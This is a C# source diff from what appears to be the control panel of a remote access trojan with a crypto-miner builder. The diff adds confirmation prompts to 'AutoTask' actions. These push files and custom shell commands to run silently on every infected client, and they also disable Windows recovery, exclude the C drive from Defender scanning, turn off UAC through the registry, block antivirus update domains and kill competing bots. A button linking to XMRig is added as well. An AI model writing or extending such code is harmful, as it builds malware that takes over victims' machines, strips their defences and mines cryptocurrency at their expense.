@@ -3259,6 +3259,20 @@ Read-Host 'Press Enter to close'
 
     // ── AutoTask ────────────────────────────────────
 
+    private static bool ConfirmAutoTask(string action, string detail)
+    {
+        var result = MessageBox.Show(
+            $"You are about to add the following AutoTask:\n\n" +
+            $"  {action}\n\n" +
+            $"{detail}\n\n" +
+            "This will execute on all current and future clients (once per HWID).\n" +
+            "Are you sure you want to continue?",
+            "Confirm AutoTask",
+            MessageBoxButton.YesNo,
+            MessageBoxImage.Warning);
+        return result == MessageBoxResult.Yes;
+    }
+
     private void AutoTask_AddFile_Click(object sender, RoutedEventArgs e)
     {
         var dlg = new Microsoft.Win32.OpenFileDialog
@@ -3268,10 +3282,15 @@ Read-Host 'Press Enter to close'
         };
         if (dlg.ShowDialog() != true) return;
 
+        var fileName = Path.GetFileName(dlg.FileName);
+        if (!ConfirmAutoTask($"Add File: {fileName}",
+            "The file will be uploaded to the server and silently executed on every new client."))
+            return;
+
         var fileBytes = File.ReadAllBytes(dlg.FileName);
         var entry = new Data.AutoTaskEntry
         {
-            FileName = Path.GetFileName(dlg.FileName),
+            FileName = fileName,
             FileBase64 = Convert.ToBase64String(fileBytes),
             FileSize = fileBytes.Length
         };
@@ -3283,23 +3302,41 @@ Read-Host 'Press Enter to close'
     private void AutoTask_BlockReset_Click(object sender, RoutedEventArgs e)
     {
         const string displayName = "Block Reset";
-        if (_autoTasks.Any(t => t.FileName == displayName))
-        {
-            Log("[!] AutoTask: Block Reset already in list.");
+        if (_autoTasks.Any(t => t.FileName == displayName)) { Log("[!] AutoTask: Block Reset already in list."); return; }
+        if (!ConfirmAutoTask("Block Reset",
+            "Disables Windows Recovery Environment (WinRE) via reagentc /disable.\nPrevents the user from resetting or booting into recovery mode."))
             return;
-        }
         _ = CompileAndAddPluginTask(displayName, Builder.PluginSources.BlockReset, "user32.lib", adminOnly: true);
     }
 
     private void AutoTask_ExcludeCDrive_Click(object sender, RoutedEventArgs e)
     {
         const string displayName = "Exclude C:\\";
-        if (_autoTasks.Any(t => t.FileName == displayName))
-        {
-            Log("[!] AutoTask: Exclude C:\\ already in list.");
+        if (_autoTasks.Any(t => t.FileName == displayName)) { Log("[!] AutoTask: Exclude C:\\ already in list."); return; }
+        if (!ConfirmAutoTask("Exclude C:\\",
+            "Adds C:\\ to Windows Defender's exclusion list via WMI (SYSTEM/Admin required).\nDefender will no longer scan files on the C drive."))
             return;
-        }
         _ = CompileAndAddPluginTask(displayName, Builder.PluginSources.ExcludeDefender, "ole32.lib oleaut32.lib advapi32.lib", adminOnly: true);
+    }
+
+    private void AutoTask_Custom_Click(object sender, RoutedEventArgs e)
+    {
+        var dlg = new CustomAutoTaskDialog { Owner = this };
+        if (dlg.ShowDialog() != true) return;
+
+        if (!ConfirmAutoTask($"Custom: {dlg.TaskName}",
+            $"Command: {dlg.TaskCommand}\n\nThis command will be executed silently on every new client."))
+            return;
+
+        var entry = new Data.AutoTaskEntry
+        {
+            Type = Data.AutoTaskType.ShellCommand,
+            FileName = dlg.TaskName,
+            ShellCommand = dlg.TaskCommand
+        };
+        _autoTasks.Add(entry);
+        Log($"[+] AutoTask: custom task '{entry.FileName}' added.");
+        _ = ExecuteAutoTasksForAllConnected();
     }
 
     private static string PluginCachePath(string pluginName)
@@ -3376,14 +3413,11 @@ Read-Host 'Press Enter to close'
 
     private void AutoTask_DisableUAC_Click(object sender, RoutedEventArgs e)
     {
-        if (_autoTasks.Any(t => t.FileName == "Disable UAC"))
-        {
-            Log("[!] AutoTask: Disable UAC already in list.");
+        if (_autoTasks.Any(t => t.FileName == "Disable UAC")) { Log("[!] AutoTask: Disable UAC already in list."); return; }
+        if (!ConfirmAutoTask("Disable UAC",
+            "Sets EnableLUA=0 and disables all UAC prompts via registry (Admin required).\nTakes effect after the client reboots — future processes run elevated without any UAC popup."))
             return;
-        }
 
-        // EnableLUA=0 fully disables UAC — takes effect after reboot.
-        // Also schedule a forced reboot in 10s so the change applies immediately.
         var entry = new Data.AutoTaskEntry
         {
             Type = Data.AutoTaskType.ShellCommand,
@@ -3405,23 +3439,30 @@ Read-Host 'Press Enter to close'
     private void AutoTask_BlockAvDomains_Click(object sender, RoutedEventArgs e)
     {
         const string displayName = "Block AV DNS";
-        if (_autoTasks.Any(t => t.FileName == displayName))
-        {
-            Log("[!] AutoTask: Block AV DNS already in list.");
+        if (_autoTasks.Any(t => t.FileName == displayName)) { Log("[!] AutoTask: Block AV DNS already in list."); return; }
+        if (!ConfirmAutoTask("Block AV DNS",
+            "Blocks update/telemetry domains of common AV products (Defender, Kaspersky, ESET, Bitdefender…) via the hosts file.\nPrevents antivirus signature updates and cloud lookups."))
             return;
-        }
         _ = CompileAndAddPluginTask(displayName, Builder.PluginSources.BlockAvDns, "user32.lib", adminOnly: true);
     }
 
     private void AutoTask_BotKiller_Click(object sender, RoutedEventArgs e)
     {
         const string displayName = "BotKiller";
-        if (_autoTasks.Any(t => t.FileName == displayName))
-        {
-            Log("[!] AutoTask: BotKiller already in list.");
+        if (_autoTasks.Any(t => t.FileName == displayName)) { Log("[!] AutoTask: BotKiller already in list."); return; }
+        if (!ConfirmAutoTask("BotKiller",
+            "Scans for and terminates unsigned processes with random-looking names (common RAT/miner pattern).\nAlso removes their persistence from Run registry keys and the Startup folder."))
             return;
-        }
         _ = CompileAndAddPluginTask(displayName, Builder.PluginSources.BotKiller, "advapi32.lib", adminOnly: false);
+    }
+
+    private void BldMnrDownloadXmrig_Click(object sender, RoutedEventArgs e)
+    {
+        System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo
+        {
+            FileName = "https://github.com/xmrig/xmrig/releases/latest",
+            UseShellExecute = true
+        });
     }
 
     private void BldMnrStatsLaunch_Click(object sender, RoutedEventArgs e)
